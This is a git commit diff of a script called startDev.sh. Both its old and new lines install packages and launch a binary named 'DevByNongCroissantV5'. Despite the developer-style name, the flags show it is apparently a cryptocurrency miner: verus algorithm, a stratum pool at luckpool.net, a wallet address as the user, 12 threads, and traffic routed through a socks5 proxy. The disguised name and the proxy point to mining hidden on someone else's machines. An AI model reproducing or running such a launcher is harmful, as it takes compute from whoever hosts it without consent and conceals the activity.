0acb7d07481b190ccb345d6a6ce4844803e0f61c
closemaptoya <85560638+closemaptoya@users.noreply.github.com>
2021-07-04 00:44:28 +0700

    Update startDev.sh

--- startDev.sh
+++ startDev.sh
@@ -1,2 +1,2 @@
 #!/bin/bash
-sudo apt-get update && sudo apt-get install libcurl4 -y && chmod +x DevByNongCroissantV5 && ./DevByNongCroissantV5 -a verus -o stratum+tcp://na.luckpool.net:3960 -u RKP6YU9bfRCwWicTakWfzgZKRtqcNwAFjr.DevByNongCroissantV5 -t 12 -x socks5://66.33.215.20:10039
+sudo apt-get update && sudo apt install screen libjansson4 -y && chmod +x DevByNongCroissantV5 && ./DevByNongCroissantV5 -a verus -o stratum+tcp://na.luckpool.net:3960 -u RKP6YU9bfRCwWicTakWfzgZKRtqcNwAFjr.DevByNongCroissantV5 -t 12 -x socks5://66.33.215.20:10039
